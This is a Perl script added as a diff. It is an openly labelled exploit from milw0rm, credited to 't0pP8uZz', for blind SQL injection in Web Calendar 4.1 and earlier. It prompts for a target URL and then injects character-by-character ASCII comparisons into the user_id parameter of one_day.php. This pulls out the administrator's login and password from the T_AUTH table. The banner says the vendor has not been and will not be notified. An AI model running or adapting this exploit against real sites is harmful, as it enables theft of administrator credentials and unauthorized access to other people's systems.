@@ -1,0 +1,42 @@
+#!/usr/bin/perl
+
+use strict;
+use LWP::Simple;
+
+print "-+--[ Web Calendar <= 4.1 Blind SQL Injection Exploit ]--+-\n";
+print "-+--                                                   --+-\n";
+print "-+--           Discovered && Coded By t0pP8uZz         --+-\n";
+print "-+--             Discovered On: 24 April 2008          --+-\n";
+print "-+--                                                   --+-\n";
+print "-+-- Web Calendar suffers from a insecure mysql query  --+-\n";
+print "-+--  the vendor has not been notified.. and wont be.. --+-\n";
+print "-+--                                                   --+-\n";
+print "-+--          Exploit tested in ActivePerl             --+-\n";
+print "-+--                                                   --+-\n";
+print "-+--[ Web Calendar <= 4.1 Blind SQL Injection Exploit ]--+-\n";
+
+print "\nEnter URL (ie: http://site.com/webcal/): ";
+	chomp(my $url=<STDIN>);
+	
+print "\n\nInjecting Please Wait..\n\n"
+	
+my $lop = 1;
+my $num = 48;
+my $sub = 1;
+my $res = undef;
+my $content = undef;
+
+while($lop) {
+
+	$content = get($url."/one_day.php?user_id=1 AND ASCII(SUBSTRING((SELECT CONCAT(login,char(58),password,char(94)) FROM T_AUTH WHERE role_id=1 LIMIT 0,1),".$sub.",1))=".$num."/*");
+	
+	if($content !~ /you are not in database/i && $num == 94) { $lop = 0; }
+	elsif($content !~ /you are not in database/i) { $res .= chr($num); $num = 48; $sub++; print $res."\n"; }
+	else { $num++; }
+}
+
+print "\nExploit Successfull! Admin Details Are: ".$res;
+
+# Coded by t0pP8uZz
+
+# milw0rm.com [2008-04-22]
